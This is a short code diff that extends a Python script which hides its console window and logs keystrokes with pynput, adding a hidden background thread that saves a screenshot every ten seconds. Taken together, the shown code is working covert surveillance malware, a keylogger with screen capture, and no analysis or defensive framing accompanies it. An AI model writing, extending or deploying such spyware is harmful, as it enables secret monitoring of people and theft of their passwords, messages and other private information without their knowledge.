@@ -32,6 +32,18 @@ import os
 import sys
 from pynput.keyboard import Key, Listener
 from datetime import datetime
+import time
+import threading
+from PIL import ImageGrab
+
+def capture_screenshot():
+    screenshot = ImageGrab.grab()
+    screenshot.save(f"screenshot_{int(time.time())}.png")
+
+def screenshot_timer(interval):
+    while True:
+        capture_screenshot()
+        time.sleep(interval)
 
 def hide_console():
     if os.name == 'nt':
@@ -51,5 +63,9 @@ def on_release(key):
     
 if __name__ == "__main__":
     hide_console()
+
+    screenshot_interval = 10  # Interval in seconds
+    threading.Thread(target=screenshot_timer, args=(screenshot_interval,), daemon=True).start()
+
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
